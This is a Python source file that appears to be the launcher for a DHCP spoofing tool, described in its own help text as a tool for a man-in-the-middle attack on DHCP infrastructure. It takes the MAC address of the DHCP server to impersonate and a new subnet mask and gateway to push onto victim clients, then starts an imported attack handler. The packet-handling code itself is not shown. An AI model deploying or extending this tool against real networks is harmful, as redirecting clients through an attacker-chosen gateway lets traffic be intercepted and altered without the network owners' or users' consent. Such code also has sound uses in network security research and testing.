import argparse

# Entry point to the program
import binascii
import multiprocessing
import os
import socket
import sys

import attack
from utils.NetworkIO import start_network_io
from utils.Utils import convert_bytes_to_ulong_wrap, convert_bytes_to_uint_wrap

parser = argparse.ArgumentParser(description="Inline DHCP spoofer. A tool to conduct a MITM attack on the DHCP infrastructure.")

parser.add_argument("--dhcp-server-mac", dest='server_mac', help="Mac address of the DHCP server, that should be spoofed (e.g. aa:bb:cc:dd:ee:ff).")
parser.add_argument("--new-subnet-mask",dest='new_subnet_mask', help="Subnet mask, that the attacked client should use.")
parser.add_argument("--new-gateway",dest='new_gateway', help="New default gateway, that the client should use. Be careful, the gateway must be in the same subnet, as the client!")

cl_args = parser.parse_args()

# if no dhcp server mac -- terminate
if cl_args.server_mac is None:
    print("DHCP server mac not provided.")
    sys.exit()

# if no new subnet mask -- terminate
if cl_args.new_subnet_mask is None:
    print("New subnet mask not provided.")
    sys.exit()

# if no new gateway -- terminate
if cl_args.new_gateway is None:
    print("New gateway not provided.")
    sys.exit()


# set up multiprocessing stuff
pool_size = multiprocessing.cpu_count()
manager = multiprocessing.Manager()
read_queue = manager.Queue()
parsed_queue = manager.Queue()
write_queue = manager.Queue()
macs_to_spoof_list = manager.list()
ip_to_mac_assignments = manager.dict()

# ...
ip_to_mac_assignments[0xffffffffffff] = 0xffffffff

# set up mac of dhcp server
# process raw dhcp server mac input
server_mac = cl_args.server_mac
server_mac = server_mac.replace(":", "")
server_mac = bytearray(bytes.fromhex(server_mac))
server_mac = convert_bytes_to_ulong_wrap(server_mac)
attack.IncommingPacketHandler.dhcp_server_mac = server_mac

# set up new subnet mask
# precess raw new subnet mask data
new_mask = cl_args.new_subnet_mask
new_mask = socket.inet_aton(new_mask)
new_mask = bytearray(new_mask)
new_mask = convert_bytes_to_uint_wrap(new_mask)
attack.IncommingPacketHandler.new_subn_mask = new_mask

# set up new gateway
# precess raw new gateway data
new_gateway = cl_args.new_gateway
new_gateway = socket.inet_aton(new_gateway)
new_gateway = bytearray(new_gateway)
new_gateway = convert_bytes_to_uint_wrap(new_gateway)
attack.IncommingPacketHandler.new_router = new_gateway


# start all doing function
start_network_io(read_queue, write_queue, parsed_queue, macs_to_spoof_list, ip_to_mac_assignments, pool_size)
